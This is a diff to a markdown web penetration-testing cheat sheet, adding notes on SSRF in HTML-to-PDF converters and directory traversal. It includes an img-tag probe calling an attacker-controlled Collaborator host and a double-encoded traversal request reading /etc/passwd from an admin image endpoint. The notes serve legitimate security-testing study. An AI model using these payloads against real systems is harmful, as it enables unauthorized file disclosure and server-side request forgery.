@@ -1010,6 +1010,12 @@ Content-Length: 0
 
 ### HTML to PDF  
 
+>Identify if SSRF can reach a server which attacker control.  
+
+```html
+<div><p>Report Heading by <img src=”https://Collaborator.com/test.png”></p>
+```  
+
 >Identify file download HTML-to-PDF convert function on target is vulnerable.  
 
 ```JavaScript
@@ -1020,9 +1026,9 @@ Content-Length: 0
 
 >Libraries used to convert HTML files to PDF documents are vulnerable to server-side request forgery (SSRF).  
 
-[PortSwigger Research HTML-to-PDF converters vuln to SSRF](https://portswigger.net/daily-swig/html-to-pdf-converters-open-to-denial-of-service-ssrf-directory-traversal-attacks)
+[PortSwigger Research SSRF](https://portswigger.net/daily-swig/ssrf)  
 
-[HTML to PDF converters such as wkhtmltopdf exploited to read local file(SSRF)](https://www.sidechannel.blog/en/html-to-pdf-converters-can-i-hack-them/index.html)  
+>Sample code below can be injected on vulnerable implementation of HTML to PDF converter such as wkhtmltopdf to read local file (SSRF).  
 
 ```html
 <html>
@@ -1312,7 +1318,9 @@ Referrer-Policy: unsafe-url
 
 ```bash
 ../../../../../../../../../../
-```
+```  
+
+>On the admin portal the images are loaded using **imagefile=** parameter, vulnerable to directory traversal.  
 
 ```html
 GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
@@ -1324,9 +1332,10 @@ GET /admin_controls/metrics/admin-image?imagefile=%252e%252e%252f%252e%252e%252f
 
 [PortSwigger Lab: File path traversal, traversal sequences stripped with superfluous URL-decode](https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode)  
   
+[PortSwigger Research File-path-traversal](https://portswigger.net/web-security/file-path-traversal)  
 
 
-## Focus Scanning 
+## Focus Scanning  
 
 >Due to the tight time limit during engagements, scan defined insertion points for specific requests.  
 
